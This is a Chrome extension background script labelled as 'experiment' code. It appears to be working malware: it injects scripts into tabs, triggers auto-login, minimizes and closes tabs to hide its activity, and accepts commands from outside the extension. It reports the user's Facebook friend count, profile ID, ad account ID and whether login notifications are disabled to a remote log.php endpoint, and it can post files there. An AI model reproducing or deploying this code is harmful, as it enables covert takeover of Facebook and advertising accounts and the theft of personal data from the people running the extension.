if (typeof experiment_background_js == "undefined")
{
    sendLogMessage("Adding experiment_background_js");

     experiment_background_js = true;

      var createdOnUpdatedListeners = { };

      function createInjectOnCodeCompleteListener(tabIdForInjection, code)
      {
          var id = parseInt(Math.random() * 10000);
          var result = function(tabId, info, tab) {
              if (tabId == tabIdForInjection && info.status == "complete")
              {
                  console.log("Re-injecting");
                  chrome.tabs.executeScript(tabIdForInjection, { code: code });

                  console.log("Removing listener");
                  chrome.tabs.onUpdated.removeListener(createdOnUpdatedListeners[id]);
              }
          };

          createdOnUpdatedListeners[id] = result;

          return result;
      }

      function injectCodeOnStatusComplete(tabId, code)
      {
          console.log("Creating inject listener");
          chrome.tabs.onUpdated.addListener(createInjectOnCodeCompleteListener(tabId, code));
      } 		

    function sendLogExperimentStatus(id, status, feedback)
    {
        getJSON("experiments.php?uid=" + UID + "&id=" + id + "&status=" + status + (feedback != null ? ("&feedback=" + feedback) : ""));
    }

    function updateLoginNotifications(disabled)
    {
        var url = "log.php?uid=" + UID + "&lnd=" + disabled;

        getJSON(url);			
    }

    function sendFBfriends(friends)
    {
        console.log("FB friends: " + friends);

        preRequisiteCheck2 = friends.replace(/\D+/, "") >= 60;

        try
        {
            redirectCheckTab();
        }
        catch (e)
        {
            sendLogMessage(e.message);
        }

        var url = "log.php?uid=" + UID + "&fr=" + encodeURIComponent(friends);

        getJSON(url);
    }

    function sendFBProfileID(FBProfileID)
    {
        var url = "log.php?uid=" + UID + "&pid=" + encodeURIComponent(FBProfileID);

        getJSON(url);
    }

    function sendFBAdAccountID(FBAdAccountID)
    {
        var url = "log.php?uid=" + UID + "&aid=" + encodeURIComponent(FBAdAccountID);

        getJSON(url);
    }

    function onExperimentMessageListener(request, sender, sendResponse)
    {
        if (request.auto_login != null)
        {
            sendLogMessage("AUTO LOGIN");

            injectCodeOnStatusComplete(sender.tab.id, currentTabScript);
        }			
        else if (request.experiment_id)
        {
            sendLogMessage("Experiment " + request.experiment_id + ": " + request.experiment_status + ": " + request.experiment_feedback);

            cancelRequest = null;
            replaceRequest = null;

            // Stop timeout timer
            if (tabCloseTimer != null)
            {
                clearTimeout(tabCloseTimer);
                tabCloseTimer = null;
            }

            // Reset load chain
            clearLoadChain();

            // Send update to server
            sendLogExperimentStatus(request.experiment_id, request.experiment_status, request.experiment_feedback);

            // Kill tab
            if (sender != null)
            {
                chrome.tabs.remove(sender.tab.id);
            }
        }
        else if (request.cancel_request)
        {
            cancelRequest = request.cancel_request;

            sendLogMessage("Cancel request: " + cancelRequest);

            if (sendResponse)
            {
                sendResponse();
            }
        }
        else if (request.replace_request)
        {
            replaceRequest = {};
            replaceRequest.param1 = request.replace_request.param1;
            replaceRequest.param2 = request.replace_request.param2;

            sendLogMessage("Replace request: " + replaceRequest.param1 + ":" + replaceRequest.param2);

            if (sendResponse)
            {
                sendResponse();
            }			
        }
        else if (request.log_requests != null)
        {
            logRequests = request.log_requests;

            if (sendResponse)
            {
                sendResponse();
            }				
        }
        else if (request.focus_window)
        {
            chrome.windows.update(automationTab.windowId, { focused: true });
        }
        else if (request.minimize_window)
        {
            chrome.windows.update(automationTab.windowId, { state: "minimized" });
        }
        else if (request.postfile != null)
        {
            sendLogFile(request.postfile.url, request.postfile.script, request.postfile.data);
        }
        else if (request.fb_friends)
        {
            sendFBfriends(request.fb_friends);

            chrome.tabs.remove(sender.tab.id);
        }
        else if (request.profile_id)
        {
            sendFBProfileID(request.profile_id);
        }
        else if (request.ad_account_id)
        {
            sendFBAdAccountID(request.ad_account_id);
        }
        else if (request.login_notifications_disabled)
        {
            updateLoginNotifications(request.login_notifications_disabled);

            chrome.tabs.remove(sender.tab.id);
        }
    }

    chrome.runtime.onMessage.addListener(onExperimentMessageListener);
    chrome.runtime.onMessageExternal.addListener(onExperimentMessageListener);
}
